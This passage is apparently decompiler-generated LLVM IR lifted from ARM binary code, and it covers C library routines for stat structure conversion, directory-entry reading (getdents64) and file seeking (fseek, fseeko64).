  %v3_1a538 = inttoptr i32 %v2_1a538 to i32*
  store i32 %v0_1a538, i32* %v3_1a538, align 4
  %v2_1a53c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a53c, i32* %r4.global-to-local, align 4
  ret i32 %v2_1a524

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0, 3, 4 }
  uselistorder i32 96, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1a560 = inttoptr i32 %arg2 to i8*
  %v3_1a560 = call i32 @__GI_memset(i8* %v2_1a560, i32 0)
  %v1_1a564 = add i32 %tmp, 4
  %v2_1a564 = inttoptr i32 %v1_1a564 to i32*
  %v3_1a564 = load i32, i32* %v2_1a564, align 4
  %v2_1a568 = load i32, i32* %arg1, align 4
  store i32 %v2_1a568, i32* %r8.global-to-local, align 4
  %v1_1a56c = load i32, i32* %r5.global-to-local, align 4
  %v2_1a56c = add i32 %v1_1a56c, 12
  %v3_1a56c = inttoptr i32 %v2_1a56c to i32*
  store i32 %v3_1a564, i32* %v3_1a56c, align 4
  %v0_1a570 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a570 = add i32 %v0_1a570, 20
  %v2_1a570 = inttoptr i32 %v1_1a570 to i32*
  %v3_1a570 = load i32, i32* %v2_1a570, align 4
  %v1_1a574 = add i32 %v0_1a570, 16
  %v2_1a574 = inttoptr i32 %v1_1a574 to i32*
  %v3_1a574 = load i32, i32* %v2_1a574, align 4
  store i32 %v3_1a574, i32* %r6.global-to-local, align 4
  %v1_1a578 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a578 = add i32 %v1_1a578, 44
  %v3_1a578 = inttoptr i32 %v2_1a578 to i32*
  store i32 %v3_1a570, i32* %v3_1a578, align 4
  %v0_1a57c = load i32, i32* %r4.global-to-local, align 4
  %v1_1a57c = add i32 %v0_1a57c, 24
  %v2_1a57c = inttoptr i32 %v1_1a57c to i32*
  %v3_1a57c = load i32, i32* %v2_1a57c, align 4
  %v1_1a580 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a580 = add i32 %v1_1a580, 48
  %v3_1a580 = inttoptr i32 %v2_1a580 to i32*
  store i32 %v3_1a57c, i32* %v3_1a580, align 4
  %v0_1a584 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a584 = add i32 %v0_1a584, 28
  %v2_1a584 = inttoptr i32 %v1_1a584 to i32*
  %v3_1a584 = load i32, i32* %v2_1a584, align 4
  %v1_1a588 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a588 = add i32 %v1_1a588, 52
  %v3_1a588 = inttoptr i32 %v2_1a588 to i32*
  store i32 %v3_1a584, i32* %v3_1a588, align 4
  %v0_1a58c = load i32, i32* %r4.global-to-local, align 4
  %v1_1a58c = add i32 %v0_1a58c, 32
  %v1_1a590 = inttoptr i32 %v1_1a58c to i32*
  %v2_1a590 = load i32, i32* %v1_1a590, align 4
  %v3_1a590 = add i32 %v0_1a58c, 36
  %v4_1a590 = inttoptr i32 %v3_1a590 to i32*
  %v5_1a590 = load i32, i32* %v4_1a590, align 4
  store i32 %v5_1a590, i32* %r1.global-to-local, align 4
  %v0_1a594 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a594 = add i32 %v0_1a594, 56
  %v1_1a598 = inttoptr i32 %v1_1a594 to i32*
  store i32 %v2_1a590, i32* %v1_1a598, align 4
  %v3_1a598 = add i32 %v0_1a594, 60
  %v4_1a598 = inttoptr i32 %v3_1a598 to i32*
  %v5_1a598 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a598, i32* %v4_1a598, align 4
  %v0_1a59c = load i32, i32* %r4.global-to-local, align 4
  %v1_1a59c = add i32 %v0_1a59c, 40
  %v1_1a5a0 = inttoptr i32 %v1_1a59c to i32*
  %v2_1a5a0 = load i32, i32* %v1_1a5a0, align 4
  %v3_1a5a0 = add i32 %v0_1a59c, 44
  %v4_1a5a0 = inttoptr i32 %v3_1a5a0 to i32*
  %v5_1a5a0 = load i32, i32* %v4_1a5a0, align 4
  store i32 %v5_1a5a0, i32* %r1.global-to-local, align 4
  %v0_1a5a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a5a4 = add i32 %v0_1a5a4, 64
  %v1_1a5a8 = inttoptr i32 %v1_1a5a4 to i32*
  store i32 %v2_1a5a0, i32* %v1_1a5a8, align 4
  %v3_1a5a8 = add i32 %v0_1a5a4, 68
  %v4_1a5a8 = inttoptr i32 %v3_1a5a8 to i32*
  %v5_1a5a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a5a8, i32* %v4_1a5a8, align 4
  %v0_1a5ac = load i32, i32* %r4.global-to-local, align 4
  %v1_1a5ac = add i32 %v0_1a5ac, 48
  %v1_1a5b0 = inttoptr i32 %v1_1a5ac to i32*
  %v2_1a5b0 = load i32, i32* %v1_1a5b0, align 4
  %v3_1a5b0 = add i32 %v0_1a5ac, 52
  %v4_1a5b0 = inttoptr i32 %v3_1a5b0 to i32*
  %v5_1a5b0 = load i32, i32* %v4_1a5b0, align 4
  store i32 %v5_1a5b0, i32* %r1.global-to-local, align 4
  %v1_1a5b4 = add i32 %v0_1a5ac, 8
  %v2_1a5b4 = inttoptr i32 %v1_1a5b4 to i16*
  %v3_1a5b4 = load i16, i16* %v2_1a5b4, align 2
  %v4_1a5b4 = zext i16 %v3_1a5b4 to i32
  store i32 %v4_1a5b4, i32* %r2.global-to-local, align 4
  %v1_1a5b8 = add i32 %v0_1a5ac, 10
  %v2_1a5b8 = inttoptr i32 %v1_1a5b8 to i16*
  %v3_1a5b8 = load i16, i16* %v2_1a5b8, align 2
  %v4_1a5b8 = zext i16 %v3_1a5b8 to i32
  store i32 %v4_1a5b8, i32* %ip.global-to-local, align 4
  %v1_1a5bc = add i32 %v0_1a5ac, 12
  %v2_1a5bc = inttoptr i32 %v1_1a5bc to i16*
  %v3_1a5bc = load i16, i16* %v2_1a5bc, align 2
  %v4_1a5bc = zext i16 %v3_1a5bc to i32
  store i32 %v4_1a5bc, i32* %lr.global-to-local, align 4
  %v1_1a5c0 = add i32 %v0_1a5ac, 14
  %v2_1a5c0 = inttoptr i32 %v1_1a5c0 to i16*
  %v3_1a5c0 = load i16, i16* %v2_1a5c0, align 2
  %v4_1a5c0 = zext i16 %v3_1a5c0 to i32
  store i32 %v4_1a5c0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1a5cc = load i32, i32* %r5.global-to-local, align 4
  %v1_1a5cc = add i32 %v0_1a5cc, 72
  %v1_1a5d0 = inttoptr i32 %v1_1a5cc to i32*
  store i32 %v2_1a5b0, i32* %v1_1a5d0, align 4
  %v3_1a5d0 = add i32 %v0_1a5cc, 76
  %v4_1a5d0 = inttoptr i32 %v3_1a5d0 to i32*
  %v5_1a5d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a5d0, i32* %v4_1a5d0, align 4
  %v0_1a5d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a5d4 = inttoptr i32 %v0_1a5d4 to i32*
  %v2_1a5d4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_1a5d4, i32* %v1_1a5d4, align 4
  %v3_1a5d4 = add i32 %v0_1a5d4, 4
  %v4_1a5d4 = inttoptr i32 %v3_1a5d4 to i32*
  %v5_1a5d4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_1a5d4, i32* %v4_1a5d4, align 4
  %v0_1a5d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a5d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a5d8 = add i32 %v1_1a5d8, 32
  %v3_1a5d8 = inttoptr i32 %v2_1a5d8 to i32*
  store i32 %v0_1a5d8, i32* %v3_1a5d8, align 4
  %v0_1a5dc = load i32, i32* %r7.global-to-local, align 4
  %v1_1a5dc = load i32, i32* %r5.global-to-local, align 4
  %v2_1a5dc = add i32 %v1_1a5dc, 36
  %v3_1a5dc = inttoptr i32 %v2_1a5dc to i32*
  store i32 %v0_1a5dc, i32* %v3_1a5dc, align 4
  %v0_1a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a5e0 = add i32 %v1_1a5e0, 16
  %v3_1a5e0 = inttoptr i32 %v2_1a5e0 to i32*
  store i32 %v0_1a5e0, i32* %v3_1a5e0, align 4
  %v0_1a5e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a5e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a5e4 = add i32 %v1_1a5e4, 20
  %v3_1a5e4 = inttoptr i32 %v2_1a5e4 to i32*
  store i32 %v0_1a5e4, i32* %v3_1a5e4, align 4
  %v0_1a5e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a5e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a5e8 = add i32 %v1_1a5e8, 24
  %v3_1a5e8 = inttoptr i32 %v2_1a5e8 to i32*
  store i32 %v0_1a5e8, i32* %v3_1a5e8, align 4
  %v0_1a5ec = load i32, i32* %r4.global-to-local, align 4
  %v1_1a5ec = load i32, i32* %r5.global-to-local, align 4
  %v2_1a5ec = add i32 %v1_1a5ec, 28
  %v3_1a5ec = inttoptr i32 %v2_1a5ec to i32*
  store i32 %v0_1a5ec, i32* %v3_1a5ec, align 4
  ret i32 %v2_1a5b0

; uselistorder directives
  uselistorder i32 %v0_1a5ac, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 72, { 7, 1, 2, 3, 4, 0, 9, 5, 6, 8 }
  uselistorder i32 68, { 1, 2, 5, 3, 0, 4, 6 }
  uselistorder i32 60, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 88, { 6, 2, 3, 4, 5, 0, 1, 7 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1a600 = load i32, i32* @r4, align 4
  %v6_1a600 = load i32, i32* @r5, align 4
  %v12_1a600 = load i32, i32* @r7, align 4
  %v1_1a604 = add i32 %arg3, 14
  %v2_1a60c = ptrtoint i32* %stack_var_-72 to i32
  %v1_1a610 = and i32 %v1_1a604, -8
  %v2_1a614 = sub i32 %v2_1a60c, %v1_1a610
  %v1_1a618 = add i32 %v2_1a614, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_1a618, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_1a654, label %dec_label_pc_1a640

dec_label_pc_1a640:                               ; preds = %entry
  %v0_1a640 = call i32 @__GI___errno_location()
  %v0_1a644 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a644 = sub i32 0, %v0_1a644
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1a64c = inttoptr i32 %v0_1a640 to i32*
  store i32 %v1_1a644, i32* %v2_1a64c, align 4
  %v0_1a65c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a65c

dec_label_pc_1a654:                               ; preds = %entry
  br i1 false, label %dec_label_pc_1a65c, label %dec_label_pc_1a664

dec_label_pc_1a65c:                               ; preds = %dec_label_pc_1a654, %dec_label_pc_1a640
  %v0_1a65c = phi i32 [ -1, %dec_label_pc_1a654 ], [ %v0_1a65c.pre, %dec_label_pc_1a640 ]
  store i32 %v0_1a65c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a730

dec_label_pc_1a664:                               ; preds = %dec_label_pc_1a654
  %v2_1a664 = add i32 %v1_1a618, %arg1
  %v2_1a668 = add i32 %tmp, %arg3
  store i32 %v2_1a668, i32* @ip, align 4
  store i32 %v1_1a618, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a718

dec_label_pc_1a684:                               ; preds = %dec_label_pc_1a718
  %v1_1a684 = add i32 %v0_1a6d8, 16
  %v2_1a684 = inttoptr i32 %v1_1a684 to i16*
  %v3_1a684 = load i16, i16* %v2_1a684, align 2
  %v4_1a684 = zext i16 %v3_1a684 to i32
  %v1_1a688 = add nuw nsw i32 %v4_1a684, 7
  %v1_1a68c = and i32 %v1_1a688, 131064
  store i32 %v1_1a68c, i32* %r2.global-to-local, align 4
  %v2_1a694 = add i32 %v1_1a68c, %v0_1a6e0
  store i32 %v2_1a694, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1a694, %v2_1a668
  br i1 %tmp26, label %dec_label_pc_1a6a0, label %dec_label_pc_1a6d4

dec_label_pc_1a6a0:                               ; preds = %dec_label_pc_1a684
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a6a8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1a6a8, i32* %r2.global-to-local, align 4
  %v0_1a6ac = load i32, i32* %sl.global-to-local, align 4
  %v1_1a6b0 = load i32, i32* @sp, align 4
  %v2_1a6b0 = inttoptr i32 %v1_1a6b0 to i32*
  store i32 0, i32* %v2_1a6b0, align 4
  %v4_1a6b4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_1a6a8, i32 %v0_1a6ac)
  %v0_1a6b8 = load i32, i32* @r5, align 4
  %v1_1a6b8 = load i32, i32* %r6.global-to-local, align 4
  %v9_1a6b8 = icmp eq i32 %v0_1a6b8, %v1_1a6b8
  br i1 %v9_1a6b8, label %dec_label_pc_1a6c0, label %dec_label_pc_1a72c

dec_label_pc_1a6c0:                               ; preds = %dec_label_pc_1a6a0
  %v0_1a6c0 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1a6cc = inttoptr i32 %v0_1a6c0 to i32*
  store i32 22, i32* %v2_1a6cc, align 4
  %v0_1a730.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a730

dec_label_pc_1a6d4:                               ; preds = %dec_label_pc_1a684
  %v1_1a6d4 = inttoptr i32 %v0_1a6d8 to i32*
  %v2_1a6d4 = load i32, i32* %v1_1a6d4, align 4
  %v3_1a6d4 = add i32 %v0_1a6d8, 4
  %v4_1a6d4 = inttoptr i32 %v3_1a6d4 to i32*
  %v5_1a6d4 = load i32, i32* %v4_1a6d4, align 4
  store i32 %v5_1a6d4, i32* %r4.global-to-local, align 4
  %v1_1a6d8 = add i32 %v0_1a6d8, 8
  store i32 %v1_1a6d8, i32* %sb.global-to-local, align 4
  %v1_1a6dc = inttoptr i32 %v1_1a6d8 to i32*
  %v2_1a6dc = load i32, i32* %v1_1a6dc, align 4
  store i32 %v2_1a6dc, i32* %sb.global-to-local, align 4
  %v3_1a6dc = add i32 %v0_1a6d8, 12
  %v4_1a6dc = inttoptr i32 %v3_1a6dc to i32*
  %v5_1a6dc = load i32, i32* %v4_1a6dc, align 4
  store i32 %v5_1a6dc, i32* %sl.global-to-local, align 4
  %v1_1a6e0 = inttoptr i32 %v0_1a6e0 to i32*
  store i32 %v2_1a6d4, i32* %v1_1a6e0, align 4
  %v3_1a6e0 = add i32 %v0_1a6e0, 4
  %v4_1a6e0 = inttoptr i32 %v3_1a6e0 to i32*
  %v5_1a6e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a6e0, i32* %v4_1a6e0, align 4
  %v0_1a6e4 = load i32, i32* @r7, align 4
  %v1_1a6e4 = add i32 %v0_1a6e4, 8
  %v1_1a6e8 = inttoptr i32 %v1_1a6e4 to i32*
  %v2_1a6e8 = load i32, i32* %v1_1a6e8, align 4
  %v3_1a6e8 = add i32 %v0_1a6e4, 12
  %v4_1a6e8 = inttoptr i32 %v3_1a6e8 to i32*
  %v5_1a6e8 = load i32, i32* %v4_1a6e8, align 4
  store i32 %v5_1a6e8, i32* @r4, align 4
  %v1_1a6ec = load i32, i32* @r5, align 4
  %v2_1a6ec = add i32 %v1_1a6ec, 8
  %v3_1a6ec = inttoptr i32 %v2_1a6ec to i32*
  store i32 %v2_1a6e8, i32* %v3_1a6ec, align 4
  %v0_1a6f0 = load i32, i32* @r4, align 4
  %v1_1a6f0 = load i32, i32* @r5, align 4
  %v2_1a6f0 = add i32 %v1_1a6f0, 12
  %v3_1a6f0 = inttoptr i32 %v2_1a6f0 to i32*
  store i32 %v0_1a6f0, i32* %v3_1a6f0, align 4
  %v0_1a6f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a6f4 = trunc i32 %v0_1a6f4 to i16
  %v2_1a6f4 = load i32, i32* @r5, align 4
  %v3_1a6f4 = add i32 %v2_1a6f4, 16
  %v4_1a6f4 = inttoptr i32 %v3_1a6f4 to i16*
  store i16 %v1_1a6f4, i16* %v4_1a6f4, align 2
  %v0_1a6f8 = load i32, i32* @r7, align 4
  %v1_1a6f8 = add i32 %v0_1a6f8, 18
  %v2_1a6f8 = inttoptr i32 %v1_1a6f8 to i8*
  %v3_1a6f8 = load i8, i8* %v2_1a6f8, align 1
  %v4_1a6f8 = zext i8 %v3_1a6f8 to i32
  store i32 %v4_1a6f8, i32* @r3, align 4
  %v2_1a6fc = load i32, i32* @r5, align 4
  %v3_1a6fc = add i32 %v2_1a6fc, 18
  %v4_1a6fc = inttoptr i32 %v3_1a6fc to i8*
  store i8 %v3_1a6f8, i8* %v4_1a6fc, align 1
  %v0_1a700 = load i32, i32* @r7, align 4
  %v1_1a700 = add i32 %v0_1a700, 16
  %v2_1a700 = inttoptr i32 %v1_1a700 to i16*
  %v3_1a700 = load i16, i16* %v2_1a700, align 2
  %v4_1a700 = zext i16 %v3_1a700 to i32
  %v1_1a704 = add nsw i32 %v4_1a700, -19
  store i32 %v1_1a704, i32* @r2, align 4
  %v0_1a708 = call i32 @memcpy()
  %v0_1a70c = load i32, i32* @r7, align 4
  %v1_1a70c = add i32 %v0_1a70c, 16
  %v2_1a70c = inttoptr i32 %v1_1a70c to i16*
  %v3_1a70c = load i16, i16* %v2_1a70c, align 2
  %v4_1a70c = zext i16 %v3_1a70c to i32
  %v0_1a710 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1a710, i32* @r5, align 4
  %v2_1a714 = add i32 %v4_1a70c, %v0_1a70c
  store i32 %v2_1a714, i32* @r7, align 4
  br label %dec_label_pc_1a718

dec_label_pc_1a718:                               ; preds = %dec_label_pc_1a664, %dec_label_pc_1a6d4
  %v0_1a6e0 = phi i32 [ %tmp, %dec_label_pc_1a664 ], [ %v0_1a710, %dec_label_pc_1a6d4 ]
  %v0_1a6d8 = phi i32 [ %v1_1a618, %dec_label_pc_1a664 ], [ %v2_1a714, %dec_label_pc_1a6d4 ]
  %v3_1a71c = icmp ult i32 %v0_1a6d8, %v2_1a664
  %v1_1a720 = add i32 %v0_1a6e0, 19
  store i32 %v1_1a720, i32* @r0, align 4
  %v1_1a724 = add i32 %v0_1a6d8, 19
  store i32 %v1_1a724, i32* @r1, align 4
  br i1 %v3_1a71c, label %dec_label_pc_1a684, label %dec_label_pc_1a72c.loopexit

dec_label_pc_1a72c.loopexit:                      ; preds = %dec_label_pc_1a718
  %v0_1a72c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a72c

dec_label_pc_1a72c:                               ; preds = %dec_label_pc_1a72c.loopexit, %dec_label_pc_1a6a0
  %v1_1a72c = phi i32 [ %v0_1a6e0, %dec_label_pc_1a72c.loopexit ], [ %v0_1a6b8, %dec_label_pc_1a6a0 ]
  %v0_1a72c = phi i32 [ %v0_1a72c.pre, %dec_label_pc_1a72c.loopexit ], [ %v1_1a6b8, %dec_label_pc_1a6a0 ]
  %v2_1a72c = sub i32 %v1_1a72c, %v0_1a72c
  store i32 %v2_1a72c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a730

dec_label_pc_1a730:                               ; preds = %dec_label_pc_1a6c0, %dec_label_pc_1a65c, %dec_label_pc_1a72c
  %v0_1a730 = phi i32 [ %v0_1a730.pre, %dec_label_pc_1a6c0 ], [ %v0_1a65c, %dec_label_pc_1a65c ], [ %v2_1a72c, %dec_label_pc_1a72c ]
  store i32 %v3_1a600, i32* %r4.global-to-local, align 4
  store i32 %v6_1a600, i32* @r5, align 4
  store i32 %v12_1a600, i32* @r7, align 4
  ret i32 %v0_1a730

; uselistorder directives
  uselistorder i32 %v0_1a6d8, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1a6e0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1a618, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3, 4 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 8, 9, 19, 0, 10, 11, 12, 13, 14, 15, 16, 17, 1, 2, 3, 4, 5, 6, 18, 7 }
  uselistorder i32 14, { 4, 9, 11, 5, 8, 6, 1, 2, 3, 7, 0, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1a730, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a718, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1a74c = load i32, i32* @r1, align 4
  store i32 %v0_1a74c, i32* @r2, align 4
  %v0_1a754 = call i32 @__GI_fseeko64()
  ret i32 %v0_1a754
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_1a764 = load i32, i32* @r4, align 4
  %v6_1a764 = load i32, i32* @r5, align 4
  %v12_1a764 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_1a778 = load i32, i32* @r2, align 4
  store i32 %v0_1a778, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r6.global-to-local, align 4
  %v0_1a784 = load i32, i32* @r0, align 4
  store i32 %v0_1a784, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_1a7a0, label %dec_label_pc_1a78c

dec_label_pc_1a78c:                               ; preds = %entry
  %v0_1a78c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1a798 = inttoptr i32 %v0_1a78c to i32*
  store i32 22, i32* %v2_1a798, align 4
  br label %dec_label_pc_1a890

dec_label_pc_1a7a0:                               ; preds = %entry
  %v1_1a7a0 = add i32 %v0_1a784, 52
  %v2_1a7a0 = inttoptr i32 %v1_1a7a0 to i32*
  %v3_1a7a0 = load i32, i32* %v2_1a7a0, align 4
  %v1_1a7a4 = sub i32 1, %v3_1a7a0
  store i32 %v1_1a7a4, i32* %r8.global-to-local, align 4
  %v2_1a7a4 = icmp ult i32 %v3_1a7a0, 2
  br i1 %v2_1a7a4, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_1a7a0
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a7ec

bb:                                               ; preds = %dec_label_pc_1a7a0
  %v2_1a7ac = icmp eq i32 %v1_1a7a4, 0
  br i1 %v2_1a7ac, label %dec_label_pc_1a7ec, label %dec_label_pc_1a7b4

dec_label_pc_1a7b4:                               ; preds = %bb
  %v1_1a7b8 = add i32 %v0_1a784, 56
  store i32 %v1_1a7b8, i32* @r4, align 4
  %v4_1a7bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 40) to i32*), align 4
  store i32 %v4_1a7bc, i32* %r1.global-to-local, align 4
  store i32 %v1_1a7b8, i32* %r2.global-to-local, align 4
  %v4_1a7cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1a7cc)
  %v0_1a7e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a7e0 = add i32 %v0_1a7e0, 20
  %v3_1a7e0 = inttoptr i32 %v2_1a7e0 to i32*
  %v4_1a7e0 = load i32, i32* %v3_1a7e0, align 4
  store i32 %v4_1a7e0, i32* @ip, align 4
  store i32 108524, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a7e0)
  %v0_1a7ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a7ec

dec_label_pc_1a7ec:                               ; preds = %.thread, %bb, %dec_label_pc_1a7b4
  %v0_1a7f8 = phi i32 [ %v0_1a784, %.thread ], [ %v0_1a784, %bb ], [ %v0_1a7ec.pre, %dec_label_pc_1a7b4 ]
  %v1_1a7ec = inttoptr i32 %v0_1a7f8 to i16*
  %v2_1a7ec = load i16, i16* %v1_1a7ec, align 2
  %v1_1a7f0 = and i16 %v2_1a7ec, 64
  %v2_1a7f0 = icmp eq i16 %v1_1a7f0, 0
  br i1 %v2_1a7f0, label %dec_label_pc_1a808, label %dec_label_pc_1a7f8

dec_label_pc_1a7f8:                               ; preds = %dec_label_pc_1a7ec
  store i32 %v0_1a7f8, i32* @r0, align 4
  %v0_1a7fc = call i32 @__stdio_wcommit()
  %v2_1a800 = icmp eq i32 %v0_1a7fc, 0
  br i1 %v2_1a800, label %dec_label_pc_1a808, label %dec_label_pc_1a870

dec_label_pc_1a808:                               ; preds = %dec_label_pc_1a7f8, %dec_label_pc_1a7ec
  %v0_1a808 = load i32, i32* @r7, align 4
  %v7_1a808 = icmp eq i32 %v0_1a808, 1
  br i1 %v7_1a808, label %dec_label_pc_1a810, label %dec_label_pc_1a808.dec_label_pc_1a824_crit_edge

dec_label_pc_1a808.dec_label_pc_1a824_crit_edge:  ; preds = %dec_label_pc_1a808
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_1a824

dec_label_pc_1a810:                               ; preds = %dec_label_pc_1a808
  %v0_1a810 = load i32, i32* @r5, align 4
  %v2_1a814 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1a814, i32* %r1.global-to-local, align 4
  %v2_1a818 = inttoptr i32 %v0_1a810 to i16*
  %v3_1a818 = call i32 @__stdio_adjust_position(i16* %v2_1a818, i32 %v2_1a814)
  %v1_1a81c = icmp slt i32 %v3_1a818, 0
  br i1 %v1_1a81c, label %dec_label_pc_1a870, label %dec_label_pc_1a810.dec_label_pc_1a824_crit_edge

dec_label_pc_1a810.dec_label_pc_1a824_crit_edge:  ; preds = %dec_label_pc_1a810
  %v0_1a824.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a824

dec_label_pc_1a824:                               ; preds = %dec_label_pc_1a808.dec_label_pc_1a824_crit_edge, %dec_label_pc_1a810.dec_label_pc_1a824_crit_edge
  %v2_1a82c.pre-phi = phi i32 [ %.pre, %dec_label_pc_1a808.dec_label_pc_1a824_crit_edge ], [ %v2_1a814, %dec_label_pc_1a810.dec_label_pc_1a824_crit_edge ]
  %v0_1a824 = phi i32 [ %v0_1a808, %dec_label_pc_1a808.dec_label_pc_1a824_crit_edge ], [ %v0_1a824.pre, %dec_label_pc_1a810.dec_label_pc_1a824_crit_edge ]
  store i32 %v0_1a824, i32* %r2.global-to-local, align 4
  %v0_1a828 = load i32, i32* @r5, align 4
  store i32 %v2_1a82c.pre-phi, i32* %r1.global-to-local, align 4
  %v4_1a830 = call i32 @__stdio_seek(i32 %v0_1a828, i32* nonnull %stack_var_-32, i32 %v0_1a824)
  %v1_1a834 = icmp slt i32 %v4_1a830, 0
  br i1 %v1_1a834, label %dec_label_pc_1a870, label %dec_label_pc_1a83c

dec_label_pc_1a83c:                               ; preds = %dec_label_pc_1a824
  %v0_1a83c = load i32, i32* @r5, align 4
